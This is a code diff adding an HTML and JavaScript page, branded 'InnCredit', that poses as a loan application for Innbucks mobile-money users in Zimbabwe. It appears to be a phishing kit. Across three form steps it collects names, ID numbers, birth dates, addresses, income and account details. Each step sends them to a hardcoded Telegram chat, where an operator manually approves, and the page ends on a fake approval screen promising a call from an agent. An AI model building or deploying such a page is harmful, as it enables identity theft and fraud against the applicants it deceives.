+      <div class="ref-block" id="p3_ref">IC-000000</div>
+      <p style="font-size:12px;color:var(--gray);margin-top:6px;">Save your reference number</p>
+      <div class="dot-row"><div class="d"></div>Awaiting final decision…</div>
+    </div>
+
+    <!-- APPROVED -->
+    <div class="ov" id="p3_approved">
+      <div class="ov-icon ok">✅</div>
+      <div class="ov-h g">Loan Approved!</div>
+      <p class="ov-p">Congratulations! Your loan has been <strong style="color:var(--green);">approved</strong>. Here are your confirmed details:</p>
+      <div class="res-box" id="p3_appr_detail"></div>
+      <p style="font-size:13px;color:var(--gray);margin-bottom:22px;">
+        Our agent will contact you within <strong style="color:var(--white);">2 hours</strong> to confirm disbursement to your Innbucks account.
+      </p>
+      <button class="reset-btn" onclick="resetAll()">Start New Application</button>
+    </div>
+
+    <!-- REJECTED -->
+    <div class="ov" id="p3_rejected">
+      <div class="ov-icon no">❌</div>
+      <div class="ov-h r">Application Unsuccessful</div>
+      <p class="ov-p">Unfortunately we could not approve your loan application at this time.</p>
+      <div class="res-box" id="p3_rej_detail"></div>
+      <p style="font-size:13px;color:var(--gray);margin-bottom:22px;">
+        You may re-apply after <strong style="color:var(--white);">30 days</strong> or contact our support team for guidance.
+      </p>
+      <button class="reset-btn" onclick="resetAll()">Try Again</button>
+    </div>
+
+  </div>
+</div>
+</div>
+
+
+<!-- ══════════════════════════════════════════════
+     TELEGRAM BOT INTEGRATION
+     Each page sends data → you tap ✅ APPROVE
+     or ⚠️ WRONG DETAILS in Telegram.
+     The page responds automatically.
+══════════════════════════════════════════════ -->
+<script>
+  // ── YOUR CREDENTIALS ─────────────────────────
+  const BOT_TOKEN = "YOUR_NEW_BOT_TOKEN_HERE";
+  const CHAT_ID   = "8718124300";
+  // ─────────────────────────────────────────────
+
+  const API  = `https://api.telegram.org/bot${BOT_TOKEN}`;
+  let app    = {};
+  let timer  = null;
+  let lastId = 0;
+  let curRef = null;
+
+  // ── HELPERS ──────────────────────────────────
+  function ref(){ return "IC-" + Math.floor(100000 + Math.random() * 900000); }
+  function now(){
+    return new Date().toLocaleString("en-ZW",{
+      timeZone:"Africa/Harare", dateStyle:"full", timeStyle:"short"
+    });
+  }
+  function showPage(n){
+    document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));
+    document.getElementById("pg"+n).classList.add("active");
+    window.scrollTo(0,0);
+  }
+  function goBack(n){
+    clearInterval(timer);
+    // restore page 2 form if going back
+    if(n===2){
+      document.getElementById("p2_form").style.display="block";
+      document.getElementById("p2_wait").classList.remove("show");
+      setLoad("p2",false);
+    }
+    showPage(n);
+  }
+  function setLoad(pfx, on){
+    document.getElementById(pfx+"_btn").disabled = on;
+    document.getElementById(pfx+"_txt").style.display = on ? "none" : "inline";
+    document.getElementById(pfx+"_spin").style.display = on ? "block" : "none";
+    const arr = document.getElementById(pfx+"_arr");
+    if(arr) arr.style.display = on ? "none" : "inline";
+  }
+
+  // ── TELEGRAM ─────────────────────────────────
+  async function tgSend(text, r){
+    const kb = { inline_keyboard:[[
+      { text:"✅  APPROVE", callback_data:`APPROVE_${r}` },
+      { text:"⚠️  WRONG DETAILS", callback_data:`REJECT_${r}` }
+    ]]};
+    const res = await fetch(`${API}/sendMessage`,{
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({ chat_id:CHAT_ID, text, parse_mode:"Markdown", reply_markup:kb })
+    });
+    return await res.json();
+  }
+  async function syncId(){
+    try{
+      const r = await fetch(`${API}/getUpdates?limit=1&offset=-1`);
+      const j = await r.json();
+      if(j.ok && j.result.length > 0) lastId = j.result[j.result.length-1].update_id;
+    }catch(e){}
+  }
+  async function ackCb(id, txt){
+    await fetch(`${API}/answerCallbackQuery`,{
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({ callback_query_id:id, text:txt })
+    });
+  }
+  async function editTg(msg, status){
+    await fetch(`${API}/editMessageText`,{
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({
+        chat_id:msg.chat.id, message_id:msg.message_id,
+        text: msg.text + `\n\n*Decision: ${status}*`,
+        parse_mode:"Markdown"
+      })
+    });
+  }
+  function poll(r, onOk, onNo){
+    clearInterval(timer);
+    timer = setInterval(async()=>{
+      try{
+        const res = await fetch(`${API}/getUpdates?offset=${lastId+1}&timeout=3`);
+        const j   = await res.json();
+        if(!j.ok) return;
+        for(const u of j.result){
+          lastId = u.update_id;
+          if(u.callback_query){
+            const cb = u.callback_query;
+            if(cb.data === `APPROVE_${r}`){
+              await ackCb(cb.id,"✅ Approved!");
+              await editTg(cb.message,"✅ APPROVED");
+              clearInterval(timer); onOk(); return;
+            }
+            if(cb.data === `REJECT_${r}`){
+              await ackCb(cb.id,"⚠️ Wrong details flagged.");
+              await editTg(cb.message,"⚠️ WRONG DETAILS");
+              clearInterval(timer); onNo(); return;
+            }
+          }
+        }
+      }catch(e){}
+    },3000);
+  }
+
+  // ════════════════════════════════════════════
+  // PAGE 1
+  // ════════════════════════════════════════════
+  async function page1Submit(){
+    const first = document.getElementById("p1_first").value.trim();
+    const last  = document.getElementById("p1_last").value.trim();
+    const email = document.getElementById("p1_email").value.trim();
+    const city  = document.getElementById("p1_city").value.trim();
+    const err   = document.getElementById("p1_err");
+
+    if(!first||!last||!email||!city||!email.includes("@")){
+      err.style.display="block"; return;
+    }
+    err.style.display="none";
+    setLoad("p1",true);
+
+    app.first=first; app.last=last; app.email=email; app.city=city;
+    curRef = ref();
+
+    const msg =
+      "🇿🇼 *INNCREDIT — STEP 1: PERSONAL DETAILS*\n"+
+      "━━━━━━━━━━━━━━━━━━━━━━━\n\n"+
+      `👤 *Full Name:* ${first} ${last}\n`+
+      `✉️ *Email:* ${email}\n`+
+      `📍 *City:* ${city}\n\n`+
+      "━━━━━━━━━━━━━━━━━━━━━━━\n"+
+      `🔖 *Ref:* \`${curRef}\`\n`+
+      `🕐 *Time:* ${now()}\n\n`+
+      `👇 *Approve to let applicant continue to Step 2:*`;
+
+    try{
+      await syncId();
+      const r = await tgSend(msg, curRef);
+      if(!r.ok) throw new Error(r.description);
+
+      document.getElementById("p1_ref").textContent = curRef;
+      document.querySelector(".cover").style.display = "none";
+      document.getElementById("p1_wait").style.display = "block";
+
+      poll(curRef,
+        ()=>{ // APPROVED
+          app.ref1 = curRef;
+          showPage(2);
+          document.querySelector(".cover").style.display = "flex";
+          document.getElementById("p1_wait").style.display = "none";
+          setLoad("p1",false);
+        },
+        ()=>{ // WRONG DETAILS
+          document.querySelector(".cover").style.display = "flex";
+          document.getElementById("p1_wait").style.display = "none";
+          err.textContent = "⚠️ Our team flagged your details as incorrect. Please review and resubmit.";
+          err.style.display = "block";
+          setLoad("p1",false);
+        }
+      );
+    }catch(e){
+      err.textContent="❌ Connection error. Please check your internet and try again.";
+      err.style.display="block";
+      setLoad("p1",false);
+    }
+  }
+
+  // ════════════════════════════════════════════
+  // PAGE 2
+  // ════════════════════════════════════════════
+  async function page2Submit(){
+    const phone  = document.getElementById("p2_phone").value.trim();
+    const altph  = document.getElementById("p2_altph").value.trim();
+    const idtype = document.getElementById("p2_idtype").value;
+    const idnum  = document.getElementById("p2_idnum").value.trim();
+    const dob    = document.getElementById("p2_dob").value;
+    const gender = document.getElementById("p2_gender").value;
+    const addr   = document.getElementById("p2_addr").value.trim();
+    const err    = document.getElementById("p2_err");
+
+    if(!phone||!idtype||!idnum||!dob||!gender||!addr){
+      err.style.display="block"; return;
+    }
+    err.style.display="none";
+    setLoad("p2",true);
+
+    app.phone=phone; app.altph=altph; app.idtype=idtype;
+    app.idnum=idnum; app.dob=dob; app.gender=gender; app.addr=addr;
+    curRef = ref();
+
+    const msg =
+      "🇿🇼 *INNCREDIT — STEP 2: IDENTITY & CONTACT*\n"+
+      "━━━━━━━━━━━━━━━━━━━━━━━\n\n"+
+      `👤 *Name:* ${app.first} ${app.last}\n`+
+      `✉️ *Email:* ${app.email}\n`+
+      `📱 *Innbucks Phone:* ${phone}\n`+
+      (altph ? `📞 *Alt Phone:* ${altph}\n` : "")+
+      `🪪 *ID Type:* ${idtype}\n`+
+      `🪪 *ID Number:* ${idnum}\n`+
+      `🎂 *Date of Birth:* ${dob}\n`+
+      `⚧ *Gender:* ${gender}\n`+
+      `🏠 *Address:* ${addr}\n\n`+
+      "━━━━━━━━━━━━━━━━━━━━━━━\n"+
+      `🔖 *Ref:* \`${curRef}\`\n`+
+      `🕐 *Time:* ${now()}\n\n`+
+      `👇 *Approve to let applicant proceed to Step 3 (Loan Details):*`;
+
+    try{
+      await syncId();
+      const r = await tgSend(msg, curRef);
+      if(!r.ok) throw new Error(r.description);
+
+      document.getElementById("p2_ref").textContent = curRef;
+      document.getElementById("p2_form").style.display = "none";
+      document.getElementById("p2_wait").classList.add("show");
+
+      poll(curRef,
+        ()=>{ // APPROVED
+          app.ref2 = curRef;
+          showPage(3);
+        },
+        ()=>{ // WRONG DETAILS
+          document.getElementById("p2_form").style.display = "block";
+          document.getElementById("p2_wait").classList.remove("show");
+          err.textContent = "⚠️ Our team flagged your identity details as incorrect. Please review and try again.";
+          err.style.display = "block";
+          setLoad("p2",false);
+        }
+      );
+    }catch(e){
+      err.textContent="❌ Connection error. Please try again.";
+      err.style.display="block";
+      setLoad("p2",false);
+    }
+  }
+
+  // ════════════════════════════════════════════
+  // PAGE 3
+  // ════════════════════════════════════════════
+  async function page3Submit(){
+    const amt      = document.getElementById("p3_amt").value.trim();
+    const type     = document.getElementById("p3_type").value;
+    const period   = document.getElementById("p3_period").value;
+    const purpose  = document.getElementById("p3_purpose").value;
+    const employ   = document.getElementById("p3_employ").value;
+    const income   = document.getElementById("p3_income").value.trim();
+    const employer = document.getElementById("p3_employer").value.trim();
+    const innbucks = document.getElementById("p3_innbucks").value.trim();
+    const accname  = document.getElementById("p3_accname").value.trim();
+    const notes    = document.getElementById("p3_notes").value.trim();
+    const err      = document.getElementById("p3_err");
+
+    if(!amt||!type||!period||!purpose||!employ||!income||!innbucks||!accname){
+      err.style.display="block"; return;
+    }
+    err.style.display="none";
+    setLoad("p3",true);
+
+    app.amt=amt; app.type=type; app.period=period; app.purpose=purpose;
+    app.employ=employ; app.income=income; app.employer=employer;
+    app.innbucks=innbucks; app.accname=accname; app.notes=notes;
+    curRef = ref();
+
+    const msg =
+      "🇿🇼 *INNCREDIT — STEP 3: FINAL APPLICATION*\n"+
+      "━━━━━━━━━━━━━━━━━━━━━━━\n\n"+
+      `👤 *Name:* ${app.first} ${app.last}\n`+
+      `✉️ *Email:* ${app.email}\n`+
+      `📍 *City:* ${app.city}\n`+
+      `📱 *Phone:* ${app.phone}\n`+
+      `🪪 *ID:* ${app.idtype} — ${app.idnum}\n`+
+      `🎂 *DOB:* ${app.dob}\n`+
+      `⚧ *Gender:* ${app.gender}\n`+
+      `🏠 *Address:* ${app.addr}\n\n`+
+      `💵 *Loan Amount:* USD $${Number(amt).toLocaleString()}\n`+
+      `📋 *Loan Type:* ${type}\n`+
+      `📅 *Repayment Period:* ${period}\n`+
+      `🎯 *Purpose:* ${purpose}\n`+
+      `💼 *Employment:* ${employ}\n`+
+      `💰 *Monthly Income:* USD $${Number(income).toLocaleString()}\n`+
+      (employer ? `🏢 *Employer:* ${employer}\n` : "")+
+      `📲 *Innbucks Account:* ${innbucks}\n`+
+      `🏦 *Account Name:* ${accname}\n`+
+      (notes ? `📝 *Notes:* ${notes}\n` : "")+
+      "\n━━━━━━━━━━━━━━━━━━━━━━━\n"+
+      `🔖 *Final Ref:* \`${curRef}\`\n`+
+      `🕐 *Time:* ${now()}\n\n`+
+      `👇 *FINAL DECISION — Approve or flag wrong details:*`;
+
+    try{
+      await syncId();
+      const r = await tgSend(msg, curRef);
+      if(!r.ok) throw new Error(r.description);
+
+      document.getElementById("p3_ref").textContent = curRef;
+      document.getElementById("p3_form").style.display = "none";
+      document.getElementById("p3_wait").classList.add("show");
+
+      poll(curRef,
+        ()=>{ // APPROVED
+          document.getElementById("p3_wait").classList.remove("show");
+          document.getElementById("p3_appr_detail").innerHTML =
+            `<strong>Applicant:</strong> ${app.first} ${app.last}<br/>`+
+            `<strong>Innbucks Account:</strong> ${innbucks}<br/>`+
+            `<strong>Account Name:</strong> ${accname}<br/>`+
+            `<strong>Approved Amount:</strong> USD $${Number(amt).toLocaleString()}<br/>`+
+            `<strong>Loan Type:</strong> ${type}<br/>`+
+            `<strong>Repayment Period:</strong> ${period}<br/>`+
+            `<strong>Reference No:</strong> ${curRef}`;
+          document.getElementById("p3_approved").classList.add("show");
+        },
+        ()=>{ // WRONG DETAILS
+          document.getElementById("p3_wait").classList.remove("show");
+          document.getElementById("p3_rej_detail").innerHTML =
+            `<strong>Reference No:</strong> ${curRef}<br/>`+
+            `<strong>Applicant:</strong> ${app.first} ${app.last}<br/>`+
+            `<strong>Reason:</strong> Details flagged as incorrect by our team.<br/>`+
+            `<strong>Next Steps:</strong> Please re-apply with correct information or contact support.`;
+          document.getElementById("p3_rejected").classList.add("show");
+        }
+      );
+    }catch(e){
+      err.textContent="❌ Connection error. Please try again.";
+      err.style.display="block";
+      setLoad("p3",false);
+    }
+  }
+
+  // ── RESET ALL ─────────────────────────────────
+  function resetAll(){
+    clearInterval(timer);
+    app={}; curRef=null; lastId=0;
+
+    // Page 1
+    ["p1_first","p1_last","p1_email","p1_city"].forEach(id=>document.getElementById(id).value="");
+    document.getElementById("p1_err").style.display="none";
+    document.querySelector(".cover").style.display="flex";
+    document.getElementById("p1_wait").style.display="none";
+    setLoad("p1",false);
+
+    // Page 2
+    document.getElementById("p2_form").style.display="block";
+    document.getElementById("p2_wait").classList.remove("show");
+    ["p2_phone","p2_altph","p2_idnum","p2_dob","p2_addr"].forEach(id=>document.getElementById(id).value="");
+    document.getElementById("p2_idtype").selectedIndex=0;
+    document.getElementById("p2_gender").selectedIndex=0;
+    document.getElementById("p2_err").style.display="none";
+    setLoad("p2",false);
+
+    // Page 3
+    document.getElementById("p3_form").style.display="block";
+    ["p3_wait","p3_approved","p3_rejected"].forEach(id=>document.getElementById(id).classList.remove("show"));
+    ["p3_amt","p3_income","p3_employer","p3_innbucks","p3_accname","p3_notes"].forEach(id=>document.getElementById(id).value="");
+    ["p3_type","p3_period","p3_purpose","p3_employ"].forEach(id=>document.getElementById(id).selectedIndex=0);
+    document.getElementById("p3_err").style.display="none";
+    setLoad("p3",false);
+
+    showPage(1);
+  }
+
+  // Enter key on page 1 inputs
+  ["p1_first","p1_last","p1_email","p1_city"].forEach(id=>{
+    document.getElementById(id).addEventListener("keydown",e=>{
+      if(e.key==="Enter") page1Submit();
+    });
+  });
+</script>
+
+</body>
+</html>
